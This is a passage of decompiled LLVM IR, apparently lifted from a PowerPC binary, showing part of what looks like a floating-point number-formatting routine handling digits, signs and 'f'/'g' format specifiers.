dec_label_pc_100217bc:                            ; preds = %dec_label_pc_10021780, %dec_label_pc_100217a0, %dec_label_pc_100217bc.backedge
  %v0_100217c0 = phi i32 [ %v0_100217c0.pre, %dec_label_pc_100217bc.backedge ], [ 0, %dec_label_pc_10021780 ], [ %v1_100217b8, %dec_label_pc_100217a0 ]
  %v0_100217bc = phi i32 [ %v0_100217bc.pre, %dec_label_pc_100217bc.backedge ], [ %v2_10021794, %dec_label_pc_10021780 ], [ %v1_100217a8, %dec_label_pc_100217a0 ]
  %v1_100217bc = add i32 %v0_100217bc, -1
  %v2_100217bc = inttoptr i32 %v1_100217bc to i8*
  %v3_100217bc = load i8, i8* %v2_100217bc, align 1
  %v4_100217bc = zext i8 %v3_100217bc to i32
  store i32 %v1_100217bc, i32* %r11.global-to-local, align 4
  %v2_100217c0 = add i32 %v4_100217bc, %v0_100217c0
  store i32 %v2_100217c0, i32* %r0.global-to-local, align 4
  %v1_100217c4 = urem i32 %v2_100217c0, 256
  store i32 %v1_100217c4, i32* %r9.global-to-local, align 4
  %v1_100217c8 = trunc i32 %v2_100217c0 to i8
  store i8 %v1_100217c8, i8* %v2_100217bc, align 1
  %v0_100217cc = load i32, i32* %r9.global-to-local, align 4
  %v1_100217cc = icmp slt i32 %v0_100217cc, 48
  %v3_100217cc = icmp eq i32 %v0_100217cc, 48
  store i1 %v1_100217cc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100217cc, i1* %cr7_eq.global-to-local, align 1
  %v1_100217d0 = icmp ult i32 %v0_100217cc, 57
  %v2_100217d0 = icmp ugt i32 %v0_100217cc, 57
  %v3_100217d0 = icmp eq i32 %v0_100217cc, 57
  store i1 %v1_100217d0, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_100217d0, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_100217d0, i1* %cr6_eq.global-to-local, align 1
  %brmerge = or i1 %v3_100217cc, %v2_100217d0
  br i1 %brmerge, label %dec_label_pc_100217bc.backedge, label %dec_label_pc_100217dc

dec_label_pc_100217bc.backedge:                   ; preds = %dec_label_pc_100217bc
  %v0_100217bc.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_100217c0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100217bc

dec_label_pc_100217dc:                            ; preds = %dec_label_pc_100217bc
  %v2_100217dc = ptrtoint i32* %stack_var_-177 to i32
  store i32 %v2_100217dc, i32* %r0.global-to-local, align 4
  %v0_100217e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_100217e0, i32* %r7.global-to-local, align 4
  %v0_100217e4 = load i32, i32* %r11.global-to-local, align 4
  %v2_100217e4 = icmp ult i32 %v0_100217e4, %v2_100217dc
  %v3_100217e4 = icmp ugt i32 %v0_100217e4, %v2_100217dc
  %v4_100217e4 = icmp eq i32 %v0_100217e4, %v2_100217dc
  store i1 %v2_100217e4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100217e4, i1* %cr7_eq.global-to-local, align 1
  store i32 %v2_10021670, i32* %r9.global-to-local, align 4
  br i1 %v3_100217e4, label %dec_label_pc_100217fc, label %dec_label_pc_100217f0

dec_label_pc_100217f0:                            ; preds = %dec_label_pc_100217dc
  store i32 %v2_100217dc, i32* %r9.global-to-local, align 4
  %v1_100217f4 = add i32 %v0_100217e0, 1
  store i32 %v1_100217f4, i32* %r7.global-to-local, align 4
  store i32 %v2_100217dc, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100217fc

dec_label_pc_100217fc:                            ; preds = %dec_label_pc_100217dc, %dec_label_pc_100217f0
  %v2_10021804 = phi i32 [ %v0_100217e4, %dec_label_pc_100217dc ], [ %v2_100217dc, %dec_label_pc_100217f0 ]
  %v0_100217fc = load i32, i32* %r31.global-to-local, align 4
  %v1_100217fc = icmp slt i32 %v0_100217fc, 103
  %v3_100217fc = icmp eq i32 %v0_100217fc, 103
  store i1 %v1_100217fc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100217fc, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10021804 = add i32 %v2_10021804, 1
  %v4_10021804 = inttoptr i32 %v3_10021804 to i8*
  store i8 0, i8* %v4_10021804, align 1
  %v0_10021808 = load i32, i32* %r11.global-to-local, align 4
  %v1_10021808 = add i32 %v0_10021808, 1
  store i32 %v1_10021808, i32* %r11.global-to-local, align 4
  %v0_1002180c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1002180c, label %dec_label_pc_10021810, label %dec_label_pc_10021834

dec_label_pc_10021810:                            ; preds = %dec_label_pc_100217fc
  %v0_10021810 = load i32, i32* %r7.global-to-local, align 4
  %v1_10021810 = icmp slt i32 %v0_10021810, -4
  %v3_10021810 = icmp eq i32 %v0_10021810, -4
  store i1 %v1_10021810, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021810, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_10021810, label %dec_label_pc_1002182c, label %dec_label_pc_10021818

dec_label_pc_10021818:                            ; preds = %dec_label_pc_10021810
  %v1_10021818 = load i32, i32* %r10.global-to-local, align 4
  %v2_10021818 = icmp sgt i32 %v1_10021818, %v0_10021810
  %v3_10021818 = icmp slt i32 %v1_10021818, %v0_10021810
  %v4_10021818 = icmp eq i32 %v1_10021818, %v0_10021810
  store i1 %v2_10021818, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10021818, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10021818, label %dec_label_pc_1002182c, label %dec_label_pc_10021820

dec_label_pc_10021820:                            ; preds = %dec_label_pc_10021818
  %v2_10021820 = sub i32 %v1_10021818, %v0_10021810
  store i32 %v2_10021820, i32* %r30.global-to-local, align 4
  store i32 102, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1002184c

dec_label_pc_1002182c:                            ; preds = %dec_label_pc_10021818, %dec_label_pc_10021810
  store i32 103, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10021840

dec_label_pc_10021834:                            ; preds = %dec_label_pc_100217fc
  %v0_10021834 = load i32, i32* %r31.global-to-local, align 4
  %v1_10021834 = icmp slt i32 %v0_10021834, 102
  %v3_10021834 = icmp eq i32 %v0_10021834, 102
  store i1 %v1_10021834, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021834, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_10021834, i32* %r4.global-to-local, align 4
  br i1 %v3_10021834, label %dec_label_pc_1002184cthread-pre-split, label %dec_label_pc_10021840

dec_label_pc_10021840:                            ; preds = %dec_label_pc_10021834, %dec_label_pc_1002182c
  store i32 0, i32* %r10.global-to-local, align 4
  store i1 false, i1* %cr6_lt.global-to-local, align 1
  store i1 false, i1* %cr6_gt.global-to-local, align 1
  store i1 true, i1* %cr6_eq.global-to-local, align 1
  br label %dec_label_pc_10021860

dec_label_pc_1002184cthread-pre-split:            ; preds = %dec_label_pc_10021834
  %v0_1002184c.pr = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1002184c

dec_label_pc_1002184c:                            ; preds = %dec_label_pc_1002184cthread-pre-split, %dec_label_pc_10021820
  %v0_10021850 = phi i32 [ %v0_1002184c.pr, %dec_label_pc_1002184cthread-pre-split ], [ %v0_10021810, %dec_label_pc_10021820 ]
  %v1_1002184c = icmp slt i32 %v0_10021850, 0
  %v2_1002184c = icmp sgt i32 %v0_10021850, 0
  %v3_1002184c = icmp eq i32 %v0_10021850, 0
  store i1 %v1_1002184c, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1002184c, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1002184c, i1* %cr6_eq.global-to-local, align 1
  store i32 %v0_10021850, i32* %r10.global-to-local, align 4
  %tmp78 = icmp sgt i32 %v0_10021850, -1
  br i1 %tmp78, label %dec_label_pc_10021860, label %dec_label_pc_10021858

dec_label_pc_10021858:                            ; preds = %dec_label_pc_1002184c
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_1002185c = load i32, i32* %r9.global-to-local, align 4
  %v3_1002185c = add i32 %v2_1002185c, -1
  %v4_1002185c = inttoptr i32 %v3_1002185c to i8*
  store i8 48, i8* %v4_1002185c, align 1
  store i32 %v3_1002185c, i32* %r9.global-to-local, align 4
  %v1_10021880.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_10021890.pre = load i1, i1* %cr6_lt.global-to-local, align 1
  br label %dec_label_pc_10021860

dec_label_pc_10021860:                            ; preds = %dec_label_pc_1002184c, %dec_label_pc_10021840, %dec_label_pc_10021858
  %v0_10021890 = phi i1 [ %v1_1002184c, %dec_label_pc_1002184c ], [ false, %dec_label_pc_10021840 ], [ %v0_10021890.pre, %dec_label_pc_10021858 ]
  %v1_10021880 = phi i32 [ %v1_10021808, %dec_label_pc_1002184c ], [ %v1_10021808, %dec_label_pc_10021840 ], [ %v1_10021880.pre, %dec_label_pc_10021858 ]
  store i32 176, i32* %r5.global-to-local, align 4
  store i32 1, i32* %stack_var_-140, align 4
  %v0_10021874 = load i32, i32* %r9.global-to-local, align 4
  %v1_10021874 = add i32 %v0_10021874, 1
  store i32 %v1_10021874, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10021880 = sub i32 %v1_10021880, %v1_10021874
  store i32 %v2_10021880, i32* %r11.global-to-local, align 4
  %v1_10021884 = inttoptr i32 %v0_10021874 to i8*
  %v2_10021884 = load i8, i8* %v1_10021884, align 1
  %v3_10021884 = zext i8 %v2_10021884 to i32
  store i32 %v3_10021884, i32* %r9.global-to-local, align 4
  br i1 %v0_10021890, label %dec_label_pc_100218f0, label %dec_label_pc_10021894

dec_label_pc_10021894:                            ; preds = %dec_label_pc_10021860
  %v0_10021894 = load i32, i32* %r10.global-to-local, align 4
  %v2_10021894 = icmp slt i32 %v0_10021894, %v2_10021880
  %v4_10021894 = icmp eq i32 %v0_10021894, %v2_10021880
  store i1 %v2_10021894, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10021894, i1* %cr7_eq.global-to-local, align 1
  store i32 112, i32* %r0.global-to-local, align 4
  store i32 112, i32* %stack_var_-132, align 4
  br i1 %v2_10021894, label %dec_label_pc_100218e8, label %dec_label_pc_100218a8

dec_label_pc_100218a8:                            ; preds = %dec_label_pc_10021894
  %v2_100218a8 = sub i32 %v0_10021894, %v2_10021880
  store i32 %v2_100218a8, i32* %r0.global-to-local, align 4
  %v4_100218a8 = icmp sgt i32 %v2_100218a8, 0
  store i32 -1, i32* %r10.global-to-local, align 4
  br i1 %v4_100218a8, label %dec_label_pc_100218c4, label %dec_label_pc_100218b4

dec_label_pc_100218b4:                            ; preds = %dec_label_pc_100218a8
  %v2_100218b8 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_100218b8, i32* @r8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1002190c

dec_label_pc_100218c4:                            ; preds = %dec_label_pc_100218a8
  store i32 ptrtoint (i32* @global_var_1002f97b.1289 to i32), i32* %r9.global-to-local, align 4
  %v2_100218d0 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_100218d0, i32* @r8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 176, i32* %stack_var_-120, align 4
  br label %dec_label_pc_1002190c

dec_label_pc_100218e8:                            ; preds = %dec_label_pc_10021894
  %v0_100218e8 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_100218e8, label %dec_label_pc_100218f8, label %dec_label_pc_100218ec

dec_label_pc_100218ec:                            ; preds = %dec_label_pc_100218e8
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100218f0

dec_label_pc_100218f0:                            ; preds = %dec_label_pc_10021860, %dec_label_pc_100218ec
  %v2_100218f0 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_100218f0, i32* @r8, align 4
  br label %dec_label_pc_1002190c

dec_label_pc_100218f8:                            ; preds = %dec_label_pc_100218e8
  %v2_100218f8 = sub i32 %v2_10021880, %v0_10021894
  store i32 %v2_100218f8, i32* %r11.global-to-local, align 4
  %v2_10021900 = add i32 %v0_10021894, %v1_10021874
  store i32 %v2_10021900, i32* %r6.global-to-local, align 4
  %v2_10021904 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_10021904, i32* @r8, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1002190c

dec_label_pc_1002190c:                            ; preds = %dec_label_pc_100218f0, %dec_label_pc_100218c4, %dec_label_pc_100218b4, %dec_label_pc_100218f8
  %v1_10021938 = phi i32 [ %v2_100218f0, %dec_label_pc_100218f0 ], [ %v2_100218d0, %dec_label_pc_100218c4 ], [ %v2_100218b8, %dec_label_pc_100218b4 ], [ %v2_10021904, %dec_label_pc_100218f8 ]
  %v0_10021918 = phi i32 [ %v2_10021880, %dec_label_pc_100218f0 ], [ 0, %dec_label_pc_100218c4 ], [ 0, %dec_label_pc_100218b4 ], [ %v2_100218f8, %dec_label_pc_100218f8 ]
  %v3_1002190c = load i32, i32* %v2_100214dc, align 4
  store i32 %v3_1002190c, i32* %r0.global-to-local, align 4
  %v1_10021910 = and i32 %v3_1002190c, 16
  store i32 %v1_10021910, i32* %r9.global-to-local, align 4
  %v3_10021910 = icmp eq i32 %v1_10021910, 0
  br i1 %v3_10021910, label %dec_label_pc_10021918, label %dec_label_pc_10021930

dec_label_pc_10021918:                            ; preds = %dec_label_pc_1002190c
  %v1_10021918 = icmp slt i32 %v0_10021918, 0
  %v3_10021918 = icmp eq i32 %v0_10021918, 0
  store i1 %v1_10021918, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021918, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10021918, label %dec_label_pc_10021920, label %dec_label_pc_10021930

dec_label_pc_10021920:                            ; preds = %dec_label_pc_10021918
  %v0_10021920 = load i32, i32* %r31.global-to-local, align 4
  %v1_10021920 = icmp slt i32 %v0_10021920, 103
  %v3_10021920 = icmp eq i32 %v0_10021920, 103
  store i1 %v1_10021920, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021920, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10021920, label %dec_label_pc_10021950, label %dec_label_pc_10021928

dec_label_pc_10021928:                            ; preds = %dec_label_pc_10021920
  %v0_10021928 = load i32, i32* %r30.global-to-local, align 4
  %v1_10021928 = icmp slt i32 %v0_10021928, 0
  %v3_10021928 = icmp eq i32 %v0_10021928, 0
  store i1 %v1_10021928, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021928, i1* %cr7_eq.global-to-local, align 1
  %tmp79 = icmp slt i32 %v0_10021928, 1
  br i1 %tmp79, label %dec_label_pc_10021950, label %dec_label_pc_10021930

dec_label_pc_10021930:                            ; preds = %dec_label_pc_10021918, %dec_label_pc_1002190c, %dec_label_pc_10021928
  %v2_10021938 = inttoptr i32 %v1_10021938 to i32*
  store i32 112, i32* %v2_10021938, align 4
  store i32 ptrtoint (i32* @global_var_1002f988.1290 to i32), i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10021944 = load i32, i32* @r8, align 4
  %v2_10021944 = add i32 %v1_10021944, 8
  %v3_10021944 = inttoptr i32 %v2_10021944 to i32*
  store i32 ptrtoint (i32* @global_var_1002f988.1290 to i32), i32* %v3_10021944, align 4
  %v0_10021948 = load i32, i32* %r0.global-to-local, align 4
  %v1_10021948 = load i32, i32* @r8, align 4
  %v2_10021948 = add i32 %v1_10021948, 4
  %v3_10021948 = inttoptr i32 %v2_10021948 to i32*
  store i32 %v0_10021948, i32* %v3_10021948, align 4
  %v0_1002194c = load i32, i32* @r8, align 4
  %v1_1002194c = add i32 %v0_1002194c, 12
  store i32 %v1_1002194c, i32* @r8, align 4
  br label %dec_label_pc_10021950

dec_label_pc_10021950:                            ; preds = %dec_label_pc_10021928, %dec_label_pc_10021920, %dec_label_pc_10021930
  %v1_10021960 = phi i32 [ %v1_10021938, %dec_label_pc_10021928 ], [ %v1_10021938, %dec_label_pc_10021920 ], [ %v1_1002194c, %dec_label_pc_10021930 ]
  %v0_10021950 = load i32, i32* %r10.global-to-local, align 4
  %v1_10021950 = add i32 %v0_10021950, 1
  store i32 %v1_10021950, i32* %r10.global-to-local, align 4
  %v4_10021950 = icmp eq i32 %v1_10021950, 0
  br i1 %v4_10021950, label %dec_label_pc_10021978, label %dec_label_pc_10021958

dec_label_pc_10021958:                            ; preds = %dec_label_pc_10021950
  %v1_10021958 = sub i32 -1, %v0_10021950
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_10021960 = add i32 %v1_10021960, 4
  %v3_10021960 = inttoptr i32 %v2_10021960 to i32*
  store i32 %v1_10021958, i32* %v3_10021960, align 4
  store i32 ptrtoint (i32* @global_var_1002f97b.1289 to i32), i32* %r9.global-to-local, align 4
  %v0_1002196c = load i32, i32* %r0.global-to-local, align 4
  %v1_1002196c = load i32, i32* @r8, align 4
  %v2_1002196c = inttoptr i32 %v1_1002196c to i32*
  store i32 %v0_1002196c, i32* %v2_1002196c, align 4
  %v0_10021970 = load i32, i32* %r9.global-to-local, align 4
  %v1_10021970 = load i32, i32* @r8, align 4
  %v2_10021970 = add i32 %v1_10021970, 8
  %v3_10021970 = inttoptr i32 %v2_10021970 to i32*
  store i32 %v0_10021970, i32* %v3_10021970, align 4
  %v0_10021974 = load i32, i32* @r8, align 4
  %v1_10021974 = add i32 %v0_10021974, 12
  store i32 %v1_10021974, i32* @r8, align 4
  br label %dec_label_pc_10021978

dec_label_pc_10021978:                            ; preds = %dec_label_pc_10021950, %dec_label_pc_10021958
  %v1_10021984 = phi i32 [ %v1_10021960, %dec_label_pc_10021950 ], [ %v1_10021974, %dec_label_pc_10021958 ]
  %v0_10021978 = load i32, i32* %r11.global-to-local, align 4
  %v1_10021978 = icmp slt i32 %v0_10021978, 0
  %v3_10021978 = icmp eq i32 %v0_10021978, 0
  store i1 %v1_10021978, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021978, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10021978, label %dec_label_pc_10021994, label %dec_label_pc_10021980

dec_label_pc_10021980:                            ; preds = %dec_label_pc_10021978
  store i32 112, i32* %r0.global-to-local, align 4
  %v0_10021984 = load i32, i32* %r6.global-to-local, align 4
  %v2_10021984 = add i32 %v1_10021984, 8
  %v3_10021984 = inttoptr i32 %v2_10021984 to i32*
  store i32 %v0_10021984, i32* %v3_10021984, align 4
  %v0_10021988 = load i32, i32* %r0.global-to-local, align 4
  %v1_10021988 = load i32, i32* @r8, align 4
  %v2_10021988 = inttoptr i32 %v1_10021988 to i32*
  store i32 %v0_10021988, i32* %v2_10021988, align 4
  %v0_1002198c = load i32, i32* %r11.global-to-local, align 4
  %v1_1002198c = load i32, i32* @r8, align 4
  %v2_1002198c = add i32 %v1_1002198c, 4
  %v3_1002198c = inttoptr i32 %v2_1002198c to i32*
  store i32 %v0_1002198c, i32* %v3_1002198c, align 4
  %v0_10021990 = load i32, i32* @r8, align 4
  %v1_10021990 = add i32 %v0_10021990, 12
  store i32 %v1_10021990, i32* @r8, align 4
  br label %dec_label_pc_10021994

dec_label_pc_10021994:                            ; preds = %dec_label_pc_10021978, %dec_label_pc_10021980
  %v1_100219bc = phi i32 [ %v1_10021984, %dec_label_pc_10021978 ], [ %v1_10021990, %dec_label_pc_10021980 ]
  %v0_10021994 = load i32, i32* %r31.global-to-local, align 4
  %v1_10021994 = icmp slt i32 %v0_10021994, 103
  %v3_10021994 = icmp eq i32 %v0_10021994, 103
  store i1 %v1_10021994, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021994, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10021994, label %dec_label_pc_1002199c, label %dec_label_pc_100219a8

dec_label_pc_1002199c:                            ; preds = %dec_label_pc_10021994
  %v3_1002199c = load i32, i32* %v2_100214dc, align 4
  store i32 %v3_1002199c, i32* %r0.global-to-local, align 4
  %v1_100219a0 = and i32 %v3_1002199c, 16
  store i32 %v1_100219a0, i32* %r9.global-to-local, align 4
  %v3_100219a0 = icmp eq i32 %v1_100219a0, 0
  br i1 %v3_100219a0, label %dec_label_pc_100219d4, label %dec_label_pc_100219a8

dec_label_pc_100219a8:                            ; preds = %dec_label_pc_10021994, %dec_label_pc_1002199c
  %v0_100219a8 = load i32, i32* %r10.global-to-local, align 4
  %v1_100219a8 = load i32, i32* %r11.global-to-local, align 4
  %v2_100219a8 = sub i32 %v1_100219a8, %v0_100219a8
  store i32 %v2_100219a8, i32* %r9.global-to-local, align 4
  %v1_100219ac = load i32, i32* %r30.global-to-local, align 4
  %v2_100219ac = icmp sgt i32 %v1_100219ac, %v2_100219a8
  %v4_100219ac = icmp eq i32 %v1_100219ac, %v2_100219a8
  store i1 %v2_100219ac, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100219ac, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100219ac, label %dec_label_pc_100219b4, label %dec_label_pc_100219d4

dec_label_pc_100219b4:                            ; preds = %dec_label_pc_100219a8
  %v2_100219b4 = sub i32 %v1_100219ac, %v2_100219a8
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_100219bc = add i32 %v1_100219bc, 4
  %v3_100219bc = inttoptr i32 %v2_100219bc to i32*
  store i32 %v2_100219b4, i32* %v3_100219bc, align 4
  store i32 ptrtoint (i32* @global_var_1002f97b.1289 to i32), i32* %r9.global-to-local, align 4
  %v0_100219c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100219c8 = load i32, i32* @r8, align 4
  %v2_100219c8 = inttoptr i32 %v1_100219c8 to i32*
  store i32 %v0_100219c8, i32* %v2_100219c8, align 4
  %v0_100219cc = load i32, i32* %r9.global-to-local, align 4
  %v1_100219cc = load i32, i32* @r8, align 4
  %v2_100219cc = add i32 %v1_100219cc, 8
  %v3_100219cc = inttoptr i32 %v2_100219cc to i32*
  store i32 %v0_100219cc, i32* %v3_100219cc, align 4
  %v0_100219d0 = load i32, i32* @r8, align 4
  %v1_100219d0 = add i32 %v0_100219d0, 12
  store i32 %v1_100219d0, i32* @r8, align 4
  br label %dec_label_pc_100219d4

dec_label_pc_100219d4:                            ; preds = %dec_label_pc_100219a8, %dec_label_pc_1002199c, %dec_label_pc_100219b4
  %v1_10021a6837 = phi i32 [ %v1_100219bc, %dec_label_pc_100219a8 ], [ %v1_100219bc, %dec_label_pc_1002199c ], [ %v1_100219d0, %dec_label_pc_100219b4 ]
  %v0_100219d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_100219d4 = icmp slt i32 %v0_100219d4, 102
  %v3_100219d4 = icmp eq i32 %v0_100219d4, 102
  store i1 %v1_100219d4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100219d4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100219d4, label %dec_label_pc_10021a5c, label %dec_label_pc_100219dc

dec_label_pc_100219dc:                            ; preds = %dec_label_pc_100219d4
  %v0_100219dc = load i32, i32* %r7.global-to-local, align 4
  %v1_100219dc = icmp slt i32 %v0_100219dc, 0
  %v3_100219dc = icmp eq i32 %v0_100219dc, 0
  store i1 %v1_100219dc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100219dc, i1* %cr7_eq.global-to-local, align 1
  store i32 %stack_var_-194.0, i32* %r5.global-to-local, align 4
  store i32 %v0_100219dc, i32* %r11.global-to-local, align 4
  store i32 43, i32* %r4.global-to-local, align 4
  %tmp80 = icmp sgt i32 %v0_100219dc, -1
  br i1 %tmp80, label %dec_label_pc_100219f8, label %dec_label_pc_100219f0

dec_label_pc_100219f0:                            ; preds = %dec_label_pc_100219dc
  %v1_100219f0 = sub i32 0, %v0_100219dc
  store i32 %v1_100219f0, i32* %r11.global-to-local, align 4
  store i32 45, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100219f8

dec_label_pc_100219f8:                            ; preds = %dec_label_pc_100219dc, %dec_label_pc_100219f0
  %v0_10021a0c31 = phi i32 [ %v0_100219dc, %dec_label_pc_100219dc ], [ %v1_100219f0, %dec_label_pc_100219f0 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_100219fc = ptrtoint i32* %stack_var_-179 to i32
  store i32 %v2_100219fc, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-179, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  store i32 10, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10021a0c

dec_label_pc_10021a0c:                            ; preds = %dec_label_pc_10021a0c.backedge, %dec_label_pc_100219f8
  %v2_10021a2c = phi i32 [ %v3_10021a2c, %dec_label_pc_10021a0c.backedge ], [ %v2_100219fc, %dec_label_pc_100219f8 ]
  %v0_10021a10 = phi i32 [ %v0_10021a10.pre, %dec_label_pc_10021a0c.backedge ], [ 2, %dec_label_pc_100219f8 ]
  %v1_10021a0c = phi i32 [ %v1_10021a0c.pre, %dec_label_pc_10021a0c.backedge ], [ 10, %dec_label_pc_100219f8 ]
  %v1_10021a20 = phi i32 [ %v0_10021a0c.pre, %dec_label_pc_10021a0c.backedge ], [ %v0_10021a0c31, %dec_label_pc_100219f8 ]
  %v2_10021a0c = sdiv i32 %v1_10021a20, %v1_10021a0c
  store i32 %v2_10021a0c, i32* %r0.global-to-local, align 4
  %v1_10021a10 = add i32 %v0_10021a10, 1
  store i32 %v1_10021a10, i32* %r7.global-to-local, align 4
  %v1_10021a14 = icmp slt i32 %v1_10021a10, 3
  %v3_10021a14 = icmp eq i32 %v1_10021a10, 3
  store i1 %v1_10021a14, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021a14, i1* %cr7_eq.global-to-local, align 1
  %v1_10021a1c = icmp slt i32 %v2_10021a0c, 0
  %v2_10021a1c = icmp sgt i32 %v2_10021a0c, 0
  %v3_10021a1c = icmp eq i32 %v2_10021a0c, 0
  store i1 %v1_10021a1c, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10021a1c, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10021a1c, i1* %cr6_eq.global-to-local, align 1
  %tmp81 = mul i32 %v2_10021a0c, -10
  store i32 %v2_10021a0c, i32* %r11.global-to-local, align 4
  %v2_10021a20 = add i32 %v1_10021a20, 48
  %v1_10021a28 = add i32 %v2_10021a20, %tmp81
  store i32 %v1_10021a28, i32* %r9.global-to-local, align 4
  %v1_10021a2c = trunc i32 %v1_10021a28 to i8
  %v3_10021a2c = add i32 %v2_10021a2c, -1
  %v4_10021a2c = inttoptr i32 %v3_10021a2c to i8*
  store i8 %v1_10021a2c, i8* %v4_10021a2c, align 1
  store i32 %v3_10021a2c, i32* %r10.global-to-local, align 4
  %v0_10021a30 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_10021a30 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_10021a30 = or i1 %v0_10021a30, %v1_10021a30
  br i1 %v2_10021a30, label %dec_label_pc_10021a0c.backedge, label %dec_label_pc_10021a34

dec_label_pc_10021a0c.backedge:                   ; preds = %dec_label_pc_10021a0c, %dec_label_pc_10021a34
  %v0_10021a0c.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10021a0c.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_10021a10.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10021a0c

dec_label_pc_10021a34:                            ; preds = %dec_label_pc_10021a0c
  %v0_10021a34 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_10021a34, label %dec_label_pc_10021a38, label %dec_label_pc_10021a0c.backedge

dec_label_pc_10021a38:                            ; preds = %dec_label_pc_10021a34
  %v1_10021a38 = add i32 %v2_10021a2c, -2
  store i32 %v1_10021a38, i32* %r9.global-to-local, align 4
  store i32 112, i32* %r0.global-to-local, align 4
  %v1_10021a40 = add i32 %v2_10021a2c, -3
  store i32 %v1_10021a40, i32* %r11.global-to-local, align 4
  %v0_10021a44 = load i32, i32* %r4.global-to-local, align 4
  %v1_10021a44 = trunc i32 %v0_10021a44 to i8
  %v4_10021a44 = inttoptr i32 %v1_10021a38 to i8*
  store i8 %v1_10021a44, i8* %v4_10021a44, align 1
  %v0_10021a48 = load i32, i32* %r5.global-to-local, align 4
  %v1_10021a48 = trunc i32 %v0_10021a48 to i8
  %v2_10021a48 = load i32, i32* %r9.global-to-local, align 4
  %v3_10021a48 = add i32 %v2_10021a48, -1
  %v4_10021a48 = inttoptr i32 %v3_10021a48 to i8*
  store i8 %v1_10021a48, i8* %v4_10021a48, align 1
  %v0_10021a4c = load i32, i32* %r0.global-to-local, align 4
  %v1_10021a4c = load i32, i32* @r8, align 4
  %v2_10021a4c = inttoptr i32 %v1_10021a4c to i32*
  store i32 %v0_10021a4c, i32* %v2_10021a4c, align 4
  %v0_10021a50 = load i32, i32* %r7.global-to-local, align 4
  %v1_10021a50 = load i32, i32* @r8, align 4
  %v2_10021a50 = add i32 %v1_10021a50, 4
  %v3_10021a50 = inttoptr i32 %v2_10021a50 to i32*
  store i32 %v0_10021a50, i32* %v3_10021a50, align 4
  %v0_10021a54 = load i32, i32* %r11.global-to-local, align 4
  %v1_10021a54 = load i32, i32* @r8, align 4
  %v2_10021a54 = add i32 %v1_10021a54, 8
  %v3_10021a54 = inttoptr i32 %v2_10021a54 to i32*
  store i32 %v0_10021a54, i32* %v3_10021a54, align 4
  %v0_10021a58 = load i32, i32* @r8, align 4
  %v1_10021a58 = add i32 %v0_10021a58, 12
  store i32 %v1_10021a58, i32* @r8, align 4
  br label %dec_label_pc_10021a5c

